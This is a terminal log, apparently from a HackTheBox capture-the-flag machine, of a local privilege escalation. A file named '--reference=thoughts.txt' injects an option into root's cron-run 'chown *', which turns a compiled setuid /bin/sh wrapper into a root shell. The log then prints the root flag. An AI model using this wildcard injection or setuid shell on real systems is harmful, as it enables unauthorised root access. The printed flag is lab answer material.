┌─[root@parrot]─[~/hackthebox/shrek] 
└──╼ #echo $TERM                     
screen-256color                      
┌─[root@parrot]─[~/hackthebox/shrek] 
└──╼ #cd ftp                         
┌─[root@parrot]─[~/hackthebox/shrek/ftp]                                   
└──╼ #ssh -i key sec@10.10.10.47     
Enter passphrase for key 'key':      
Last login: Thu Jan  2 05:29:36 2020 from 10.10.14.14                      
[sec@shrek ~]$ cd /usr/src           
[sec@shrek src]$ ls                  
exec.c  thoughts.txt                 
[sec@shrek src]$ rm exec.c           
rm: remove write-protected regular file 'exec.c'? y                        
[sec@shrek src]$ touch -- --reference=thoughts.txt                         
[sec@shrek src]$ ls                  
'--reference=thoughts.txt'   thoughts.txt                                  
[sec@shrek src]$ gcc                 
gcc: fatal error: no input files     
compilation terminated.              
[sec@shrek src]$ vi exec.c           
[sec@shrek src]$ ls                  
'--reference=thoughts.txt'   thoughts.txt                                  
[sec@shrek src]$ vi exec.c           
[sec@shrek src]$ cat exec.c          
#include <stdio.h>                   
#include <stdlib.h>                  
#include <unistd.h>                  
int main( int argc,char *argv[] )    
{                                    
    setreuid(0, 0);                  
    execve("/bin/sh",NULL ,NULL);    

}                                    
[sec@shrek src]$                     
[sec@shrek src]$ gcc exec.c -o exec  
[sec@shrek src]$ chmod 4755 exec     
[sec@shrek src]$ ls                  
 exec   exec.c  '--reference=thoughts.txt'   thoughts.txt                  
[sec@shrek src]$ date                
Thu Jan  2 08:11:36 UTC 2020         
[sec@shrek src]$ ls -la              
total 28                             
drwxr-xr-x 2 sec  root  4096 Jan  2 08:10  .                               
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
-rwsr-xr-x 1 sec  users 8496 Jan  2 08:10  exec                            
-rw-r--r-- 1 sec  users  152 Jan  2 08:10  exec.c                          
-rw-r--r-- 1 sec  users    0 Jan  2 08:09 '--reference=thoughts.txt'       
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
[sec@shrek src]$ date                
Thu Jan  2 08:12:01 UTC 2020         
[sec@shrek src]$ ls -la              
total 28                             
drwxr-xr-x 2 sec  root  4096 Jan  2 08:10  .                               
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
-rwsr-xr-x 1 sec  users 8496 Jan  2 08:10  exec                            
-rw-r--r-- 1 sec  users  152 Jan  2 08:10  exec.c                          
-rw-r--r-- 1 sec  users    0 Jan  2 08:09 '--reference=thoughts.txt'       
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
[sec@shrek src]$ ls -la              
total 28                             
drwxr-xr-x 2 sec  root  4096 Jan  2 08:10  .                               
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
-rwsr-xr-x 1 sec  users 8496 Jan  2 08:10  exec                            
-rw-r--r-- 1 sec  users  152 Jan  2 08:10  exec.c                          
-rw-r--r-- 1 sec  users    0 Jan  2 08:09 '--reference=thoughts.txt'       
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
[sec@shrek src]$ ls -la              
total 28                             
drwxr-xr-x 2 sec  root  4096 Jan  2 08:10  .                               
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
-rwsr-xr-x 1 sec  users 8496 Jan  2 08:10  exec                            
-rw-r--r-- 1 sec  users  152 Jan  2 08:10  exec.c                          
-rw-r--r-- 1 sec  users    0 Jan  2 08:09 '--reference=thoughts.txt'       
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
[sec@shrek src]$ ./exec              
[sec@shrek src]$ ls -la              
total 28                             
-rw-r--r-- 1 sec  users    0 Jan  2 08:09 '--reference=thoughts.txt'       
drwxr-xr-x 2 sec  root  4096 Jan  2 08:10  .                               
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
-rwsr-xr-x 1 sec  users 8496 Jan  2 08:10  exec                            
-rw-r--r-- 1 sec  users  152 Jan  2 08:10  exec.c                          
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
[sec@shrek src]$ chmod 4755 exec     
chmod: changing permissions of 'exec': Operation not permitted             
[sec@shrek src]$ ls -la              
total 28                             
-rw-r--r-- 1 sec  users    0 Jan  2 08:09 '--reference=thoughts.txt'       
drwxr-xr-x 2 sec  root  4096 Jan  2 08:10  .                               
drwxr-xr-x 8 sec  root  4096 Aug 16  2017  ..                              
-rwsr-sr-x 1 root root  8496 Jan  2 08:10  exec                            
-rw-r--r-- 1 root root   152 Jan  2 08:10  exec.c                          
-rw-r--r-- 1 root root    91 Aug 22  2017  thoughts.txt                    
[sec@shrek src]$ ./exec              
bash-4.4# id                         
uid=0(root) gid=100(users) groups=100(users),10(wheel),95(storage),98(power)                                                                           
bash-4.4# ls                         
'--reference=thoughts.txt'   exec   exec.c   thoughts.txt                  
bash-4.4# cd /root                   
bash-4.4# ls                         
chown  root.txt                      
bash-4.4# cat root.txt               
54d3c885deb157dcb786b79814c88178     
bash-4.4# cat chown                  
#!/usr/bin/python                    

from subprocess import run, PIPE, DEVNULL                                  

find = run(["/usr/bin/find", "/usr/src", "-perm", "-4000"], stdout=PIPE, stderr=DEVNULL, encoding="utf-8").stdout.split('\n')[:-1]                     

chown = run(["cd /usr/src; /usr/bin/chown nobody:nobody *"], stderr=DEVNULL, shell=True)                                                               

for suid in find:                    
        chmod = run(["/usr/bin/chmod", "+s", suid],stderr=DEVNULL)         
bash-4.4# crowntab - l               
bash: crowntab: command not found    
bash-4.4# crowntab -l                
bash: crowntab: command not found    
bash-4.4# crontab -l                 
@reboot /bin/rm /srv/ftp/*.txt       
@reboot /usr/bin/python /root/.script.py                                   
*/5 * * * * /root/chown              
bash-4.4# exit                       
exit                                 
[sec@shrek src]$ exit                
exit                                 
[sec@shrek src]$ ^C                  
[sec@shrek src]$                     
